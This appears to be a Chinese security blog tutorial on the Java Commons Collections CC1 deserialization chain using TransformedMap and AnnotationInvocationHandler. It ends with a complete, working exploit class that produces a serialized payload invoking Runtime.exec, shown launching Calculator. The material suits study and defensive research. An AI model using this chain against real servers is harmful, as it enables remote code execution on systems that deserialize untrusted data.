<h1 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h1><p>这里存在一个问题，想要在实战中能触发rce，将构造的Payload数据流发送过去后，目标服务端调用readObject进行反序列化还原对象，&#x3D;&#x3D;将TransformedMap还原后还需要进行一次put动作才能触发transform函数来达到rce效果。&#x3D;&#x3D;</p>
<p>但是很遗憾目前我们构造的这些，它只是一个本地的demo，因为发送到目标服务器后它并不会主动进行一次put动作(当然也有可能代码会在readObject后调用一次put，看运气！)。</p>
<p>那么如果我们在Java中能找到满足以下条件的类，就能进行RCE。</p>
<ol>
<li>类支持序列化操作</li>
<li>重写了readObject函数，并且在readObject函数中调用了我们传入的TransformedMap，并做了put的动作来触发transform函数。</li>
<li>同时又要确保目标服务器上也存在该类，所以最好是JavaJdk中的类。</li>
</ol>
<h1 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h1><p>那么在Java中有一个类<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，这个是属于Java原生库里的类，不需要额外引入依赖。</p>
<p>来看一下这个类的readObject函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">  var1.defaultReadObject();</span><br><span class="line">  <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">    <span class="comment">// 异常抛出，被我删了，简化阅读。</span></span><br><span class="line">    ......</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">  <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">    Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">    <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">    <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">      <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">        <span class="comment">// 注意看这里，这里有一个setValue的动作，实际上我们回想前边TransformedMap的回调函数触发机制，是不是也说明过setValue能触发decorate()的第三个参数的回调函数。</span></span><br><span class="line">        var5.setValue(...).setMember(...);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在代码中我们可以注意到有调用setValue，在最开始介绍TransformedMap时就说过，除了put函数外呢，通过迭代器后调用setValue动作也会触发transform()函数的执行。</p>
<p><code>var5.setValue(...).setMember(......);</code></p>
<p>那么我们只要能将这个var5设为我们自定义的那个TransformedMap对应的迭代器，就可以进行rce。</p>
<p>那么我们先来分析一下var5是哪来的。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112802836.png" alt="图片"></p>
<p>var5来自var4的<code>next()</code>函数，继续跟进看看var4，var4来自memberValues，并且这里是调用了<code>iterator()</code>获取一个迭代器，所以memberValues肯定是一个集合。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112812567.png" alt="图片"></p>
<p>memberValues是在AnnotationInvocationHandler的构造函数传进来的一个map集合。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112822961.png" alt="图片"></p>
<p>那么我们只要构造一个AnnotationInvocationHandler，然后将带有rce调用链的TransformedMap传入AnnotationInvocationHandler的构造函数，这样就能将memberValues赋值为带有恶意攻击的TransformedMap。</p>
<p>然后我们将AnnotationInvocationHandler进行序列化，发送到目标服务器，当目标服务器在反序列化调用readObjet时，就会调用AnnotationInvocationHandler里的readObject，而恰好这个readObject内又调用了memberValues迭代器的setValue函数，那么他就会触发transform函数进行利用链的指向。</p>
<p>有了思路后，我们就来实例化AnnotationInvocationHandler这个类，但是这个类的构造函数是私有的，所以我们这里需要通过Java的反射才能获取到这个类的实例。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"><span class="comment">// 设置这一行才能访问私有的</span></span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 这里的transformedMap就是我们最开始分析的那个</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">expObj</span> <span class="operator">=</span> construct.newInstance(Retention.class, transformedMap);</span><br></pre></td></tr></table></figure>

<p>这里我们注意到构造函数上还传了一个<code>Retention.class</code>的东西，我们回到AnnotationInvocationHandler的构造函数逻辑来看一下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">  Class[] var3 = var1.getInterfaces();</span><br><span class="line">  <span class="comment">// 这里要求var1必须是一个注解，同时接口长度只能为1，并且要求第一个接口为Annotation</span></span><br><span class="line">  <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">    <span class="comment">// 满足条件后会存入this.type这个成员属性里</span></span><br><span class="line">    <span class="built_in">this</span>.type = var1;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实那个if就是在校验var1是不是一个注解，当然这里的逻辑实际上随便传一个符合这个条件的注解就可以了。这样我们就能构造一个AnnotationInvocationHandler的实例了。</p>
<p>但是别急，我们回到AnnotationInvocationHandler的readObject函数，来分析一下var7，这个前边没有讲到。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var1.defaultReadObject();</span><br><span class="line"><span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line"><span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">  Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">  <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">  <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">  <span class="comment">// 注意看这里，这里还有一个判断，如果var7为null，那么我们就无法进入到setValue，也就无法触发transform()。</span></span><br><span class="line">  <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">    var5.setValue(......);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么来分析一下这个var7是哪里来的</p>
<ol>
<li><p>var7 是通过<code>var3.get(var6)</code>获得</p>
</li>
<li><p>var3 为<code>var2.memberTypes();</code></p>
</li>
<li><p>var2 为<code>AnnotationType.getInstance(this.type); </code>这里的this.type实际上就是前边构造函数赋值的那个<code>Retention.class</code>。然后得到一个AnnotationType</p>
</li>
<li><p>往回推，看<code>var2.memberTypes();</code>得到的结果是一个map并且赋值给了var3</p>
</li>
<li><p>来看一下var3这个map里存的是什么值，其实就是一个键值对<code>&#123;value=class java.lang.annotation.RetentionPolicy&#125;</code>，键是<code>value</code>，值是<code>class java.lang.annotation.RetentionPolicy</code></p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AnnotationType</span> <span class="variable">instance</span> <span class="operator">=</span> AnnotationType.getInstance(Retention.class);</span><br><span class="line">System.out.println(instance.memberTypes());</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112922215.png" alt="图片"></p>
<ol start="6">
<li><p>再回来看var7，var7是从var3.get(var6)中获得到的，并且随后进行了<code>var7 != null</code>的判断，那么这里var3我们已经知道他里边存储的键值对是<code>&#123;value=class java.lang.annotation.RetentionPolicy&#125;</code>，所以这里只需要能让<code>var3.get(&quot;value&quot;)</code>达到这样的效果，那么var7就不会为null。</p>
</li>
<li><p>那么var3.get()又是根据var6来的，看下边分析。</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 而var4这个迭代器其实就是this.memberValues，而this.memberValues其实就是TransformedMap。</span></span><br><span class="line"><span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">  <span class="comment">// var5呢就是var4这个迭代器输出的一个键值对包装类Map.Entry</span></span><br><span class="line">  Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">  <span class="comment">// var6实际上就是var5这个键值对里的键</span></span><br><span class="line">  <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>所以我们只需要在TransformedMap里存一个键值对为<code>value=xxx</code>的，就可以让<code>var7 != null</code>成立。从而进入执行setValue的代码</li>
</ol>
<h1 id="完整的Exp"><a href="#完整的Exp" class="headerlink" title="完整的Exp"></a>完整的Exp</h1><p>通过上边的分析后，我们只需要将所有的利用给串起来，最后生成AnnotationInvocationHandler的序列化数据即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">  )</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过反射创建AnnotationInvocationHandler</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">exp</span> <span class="operator">=</span> declaredConstructor.newInstance(Retention.class, transformedMap);</span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(exp);</span><br><span class="line">oos.close();</span><br></pre></td></tr></table></figure>

<p>但是当我们运行后就会发现报错了，这个是因为将对象序列化时需要序列化的对象是必须要实现Serializable接口的，而Runtime这个类它并没有实现这个接口。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021113018711.png" alt="图片"></p>
<p>那么解决这个问题的办法呢就是将前边的Transformer改造为使用反射的方式进行获取Runtime这个对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是通过反射获取Runtime</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>);</span><br><span class="line">runtime.exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 改造成对应的Transformer</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">  ),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">  ),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">  )</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>最后完整的生成代码如下:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1TransformedMap</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">annotationInvocationHandlerClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerDeclaredConstructor</span> <span class="operator">=</span> annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">exp</span> <span class="operator">=</span> annotationInvocationHandlerDeclaredConstructor.newInstance(Retention.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(exp);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021113056695.png" alt="图片"></p>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>Jdk在8u71以后修改了sun.reflect.annotation.AnnotationInvocationHandler 的readObject函数导致在高版本Java中不可用。</p>
<p>致谢</p>
<p>本文的代码和分析过程均参考p牛的《Java安全名漫谈》实现: <a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings%EF%BC%8C%E9%9D%9E%E5%B8%B8%E6%84%9F%E8%B0%A2%EF%BC%81">https://github.com/phith0n/JavaThings，非常感谢！</a></p>
</div>

<div class="meta">
	
</div>
</article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
	
	
	<a class="addthis_button_tweet"></a>
	
	
	<a class="addthis_counter addthis_pill_style"></a>
	</div>
  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
</div>




    </div>
    <footer id="footer">
    <div style="display:inline">
    Copyright &copy; 2023

    Mask安全小组

</div>


    </footer>
    <script src="/javascripts/fabric.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script>
 <!-- Delete or comment this line to disable Fancybox -->



<!-- end toload --> 
</div>
</div>
<script src="/javascripts/jquery.ui.totop.js" type="text/javascript"></script>
<script type="text/javascript">
/*<![CDATA[*/
;(function($){$().UItoTop({easingType:'easeOutCirc'});})(jQuery); 
/*]]>*/
</script><!-- remove it to remove the scroll to top button -->
</body>
</html>
